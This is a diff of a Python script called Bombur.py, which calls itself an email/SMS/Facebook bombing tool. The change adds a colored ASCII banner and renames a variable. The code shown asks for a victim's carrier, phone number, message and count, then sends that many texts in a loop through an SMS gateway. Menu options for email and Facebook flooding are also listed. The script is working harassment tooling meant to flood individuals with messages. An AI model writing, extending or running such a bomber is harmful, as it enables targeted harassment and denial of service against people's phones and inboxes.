@@ -2,15 +2,22 @@
 __author__ = 'KattStof'
 #Bombur.py - a simple email/sms/facebook bombing script
 # One Script to rule them all
+from colorama import Fore, init
 import smtplib, getpass, time
 from fbchat import Client
 from fbchat.models import *
 from GSMS import GSMS
-print("__________________")
-print("   BOMBUR")
-print("Email/SMS/FaceBook Bomber")
-print("__________________")
-print('1) SMS Bomb')
+init(convert=True)
+print( Fore.YELLOW + """
+ _______     ______   ___      ___  _______   ____  ____   _______   
+|   _  "\   /    " \ |"  \    /"  ||   _  "\ ("  _||_ " | /"      \  
+(. |_)  :) // ____  \ \   \  //   |(. |_)  :)|   (  ) : ||:        | 
+|:     \/ /  /    ) :)/\\  \/.    ||:     \/ (:  |  | . )|_____/   ) 
+(|  _  \\(: (____/ //|: \.        |(|  _  \\  \\ \__/ //  //      /  
+|: |_)  :)\        / |.  \    /:  ||: |_)  :) /\\ __ //\ |:  __   \  
+(_______/  \"_____/  |___|\__/|___|(_______/ (__________)|__|  \___) 
+                                                                     """)
+print(Fore.GREEN + '1) SMS Bomb')
 print('2) E-mail Bomb')
 print('3) Facebook Bomb')
 choice = input("Enter Option: ")
@@ -22,7 +29,7 @@ if choice == '1':
     print(' 1)AT&T \n 2)Verizon \n 3)T-Mobile \n 4)Sprint \n 5)VirginMobile \n 6)USCellular \n 7)Boost')
     carrier = input('Enter Phone Carrier: ')
     number = input('Enter Phone Number: ')
-    message = input("Messge to send: ")
+    texttosend = input("Messge to send: ")
     ammount = int(input('Number of texts to send: '))
     if carrier == '1':
         carrier = 'att'
@@ -40,7 +47,7 @@ if choice == '1':
         carrier = 'boost'
     for x in range(ammount):
         time.sleep(2)
-        GSMS.sms(username, password, number,carrier,message)
+        GSMS.sms(username, password, number,carrier,texttosend)
         print ('Sending text #', x + 1)
     print (str(ammount)," Text sent to " ,number, " successfully")
 if choice == '2':
